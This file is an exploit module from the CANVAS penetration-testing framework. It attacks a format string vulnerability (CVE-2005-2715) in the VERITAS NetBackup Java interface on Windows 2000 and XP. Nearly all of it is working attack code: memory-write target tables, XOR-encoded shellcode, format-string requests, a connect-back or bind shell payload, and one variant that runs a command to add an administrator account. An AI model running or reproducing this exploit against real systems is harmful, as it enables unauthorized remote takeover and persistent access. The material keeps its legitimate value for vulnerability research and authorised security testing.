#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2007
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

import os
import getopt
import socket
import time
import struct

# CANVAS modules
from exploitutils import *
from tcpexploit import *
from MOSDEF import mosdef
import xorencoder
import shellcodeGenerator

# GUI info
NAME='VERITAS NetBackup Java User Interface Format String'
DESCRIPTION='VERITAS NetBackup Java User Interface Format String'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Symantec"
DOCUMENTATION['Date public']='10/12/05'
DOCUMENTATION['References']='http://www.zerodayinitiative.com/advisories/ZDI-05-001.html'
DOCUMENTATION['Repeatability']=''
DOCUMENTATION['VersionsAffected']=''
DOCUMENTATION['CVE Name']='CVE-2005-2715'
DOCUMENTATION['CVE Url']='http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2715'
DOCUMENTATION['CVSS'] = 10.0

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Remote'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000','XP']

NOTES="""
Based on the public exploit which is working pretty well.
For the 1st target, you'll have to run the exploit twice to trigger the PebLock function once overwritten.

Tested on:
VERITAS NetBackup 5.0 on Windows 2000 Professional SP4 English OOTB

Usage:
./commandlineInterface.py -v 1 -p 5555
./exploits/netbackup_javaui/netbackup_javaui.py -v 1 -t 10.10.11.21 -l 10.10.11.1 -d 5555
"""

CHANGELOG="""
"""

targets={
    0: ['Autodetect (N/A)',[],[]],
    # cld (0xfc) searches up the stack, std (0xfd), searches down the stack
    1: ['VERITAS NetBackup 4.5, 5.0 or 6.0 on Windows 2000 SP0-SP4, XP SP0-SP1a',
        [0x7ffdf250,0x7ffdf252,0x7ffdf254,0x7ffdf256,0x7ffdf258,0x7ffdf25a,0x7ffdf022,0x7ffdf020],
        [0x5f54,0x90b8,0x9090,0xfd90,0xaff2,0xc357,0x7ffd,0xf250]],
    2: ['VERITAS NetBackup 4.5, 5.0 or 6.0 on Windows XP SP2',
        [0x7ffdf250,0x7ffdf252,0x7ffdf254,0x7ffdf256,0x7ffdf258,0x7ffdf25a,0x0012ffb0,0x0012ffb2,0x0012ffb6,0x0012ffb4],
        [0x5f54,0x90b8,0x9090,0xfc90,0xaff2,0xc357,0x9090,0x9090,0x7ffd,0xf250]],
    3: ['VERITAS NetBackup 4.5, 5.0 or 6.0 on Windows 2000 SP0-SP4, XP SP0-SP1a (TEB METHOD - ADD USER PAYLOAD)',
        # the TEB write logic
        # 1) install searchcode at 0x7ffdf250
        # 2) install our own SEH chain right behind payload
        # 3) install pointer to custom SEH chain in TEB at 0x7FFDE000
        # 4) raise the stack top in the TEB at 0x7FFDE004 (so new SEH handler is valid)
        # 5) trigger exception
        [   0x7ffdf250, 0x7ffdf252, 0x7ffdf254, 0x7ffdf256, 0x7ffdf258, 0x7ffdf25a, 0x7ffdf25c, 0x7ffdf25e, 0x7ffdf262, 0x7ffdf260, 0x7ffde002, 0x7ffde000, 0x7ffde006, 0x7ffde004, 0x00000000, 0x00000000],
        [   0x5f54,     0x90b8,     0x9090,     0xfc90,     0xaff2,     0xc357,     0xffff,     0xffff,     0x7ffd,     0xf250,     0x7ffd,     0xf25c,     0xff00,     0xff00,     0x0101,     0x0202]],
}

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.setInfo(DESCRIPTION)
        self.name=NAME
        self.port=13722
        self.version=0
        self.badstring='\0\r\n'
        self.subesp=1000
        return

    def neededListenerTypes(self):
        import canvasengine
        return [canvasengine.WIN32MOSDEF]

    def createShellcode(self):

        if self.version == 3:
            import shellcode.standalone.windows.payloads as payloads
            p   = payloads.payloads()
            sc  = p.win32_exec("cmd.exe /c net user c c /ADD && net localgroup administrators c /ADD")
            rawshellcode = p.assemble(sc)
        else:
            sc=shellcodeGenerator.win32()
            sc.addAttr('findeipnoesp',{'subespval':self.subesp})
            if self.version==1:
                sc.addAttr('Fix RtlEnterCriticalSection',{'SimpleFix':1})
            if self.callback.ip=='0.0.0.0':
                sc.addAttr('BindMosdef',{'port':self.callback.port})
            else:
                sc.addAttr('tcpconnect',{'port':self.callback.port,'ipaddress':self.callback.ip})
                sc.addAttr('RecvExecWin32',{'socketreg':'FDSPOT'}) #MOSDEF
            sc.addAttr('ExitThread',None)
            rawshellcode=sc.get()            

        encoder=xorencoder.simpleXOR()
        encoder.setbadstring(self.badstring)
        ret=encoder.find_key(rawshellcode)
        if ret==0:
            self.log('Could not find a key for this shellcode!')
            raise Exception,'No shellcode generated'
        self.shellcode=encoder.encode(rawshellcode)
        if self.shellcode=='':
            raise Exception,'No shellcode generated'
        self.log('Xor key used: %x'%(encoder.getkey()))
        
        self.log('Length of shellcode=%s'%(len(self.shellcode)))
        self.shellcode='\x90'*(487-len(self.shellcode))+self.shellcode
        return self.shellcode

    def getArgs(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get('port',self.port))
        return

    def test(self):
        self.getArgs()
        self.log('%s testing host %s:%s'%(self.name,self.host,self.port))
        s=self.gettcpsock()
        s.set_timeout(4)
        try:
            s.connect((self.host,self.port))
        except:
            self.log('No connection could be established')
            return 0        
        return 1

    def buildRequest(self,index):
        print '%04x %04x %08x %08x'%(self.what[index],self.what[index+1],self.where[index],self.where[index+1])
        request=''
        request+=' 101      6\n'
        hi=self.what[index]-77
        lo=self.what[index+1]-hi-77
        request+='%08x'*6+'%%%dx%%hn%%%dx%%hn'%(hi,lo)+'\n'
        request+='dummy space\n'
        request+=self.shellcode+'\n'
        request+=struct.pack('<L',self.where[index])+'AAAA'+struct.pack('<L',self.where[index+1])+'\n'
        request+='spare bits\n'
        request+='spare bits\n'
        request+='\n'
        #print request
        return request

    def run(self):
        self.getArgs()
        self.setInfo('%s attacking %s:%d (in progress)'%(NAME,self.host,self.port))
        if self.version==0:
            self.test()
            if self.version==0:
                self.log('Could not determine version automatically')
                self.setInfo('%s attacking %s:%d - done (failed!)'%(NAME,self.host,self.port))
                return 0
        self.info,self.where,self.what=targets[self.version]
        self.log('Attacking %s:%d'%(self.host,self.port))

        s=self.gettcpsock()
        s.set_timeout(4)
        s.connect((self.host,self.port))
        for i in range(0,len(self.where),2):
            self.websend(s,' 118      1\nour space filler\n')
            response=''
            while response.count('\n')!=2:
                response+=self.webrecv(s)
            print response,
            self.websend(s,self.buildRequest(i))
            response=''
            while response.count('\n')!=2:
                response+=self.webrecv(s)
            print response,
        if self.version==2:
            self.websend(s,' 118      1\nour space filler\n')
            response=''
            while response.count('\n')!=2:
                response+=self.webrecv(s)
            print response,
            request=''
            request+=' 101      6\n'
            request+='%n\n'
            request+='dummy space\n'
            request+=self.shellcode+'\n'
            request+='AAAAAAAAAAAA\n'
            request+='spare bits\n'
            request+='spare bits\n\n'
            self.websend(s,request)
            response=''
            while response.count('\n')!=2:
                response+=self.webrecv(s)
            print response,
        s.close()
        time.sleep(4)
        if self.ISucceeded():
            self.setInfo('%s attacking %s:%d - done (success!)'%(NAME,self.host,self.port))
            return 1
        else:
            self.setInfo('%s attacking %s:%d - done (failed)'%(NAME,self.host,self.port))
            return 0

    def displayVersions(self):
        i=0
        print 'Available versions:'
        for listline in targets.values():
            print '\t%d: %s'%(i,listline[0])
            i+=1

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v%s'%(DESCRIPTION,VERSION)
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
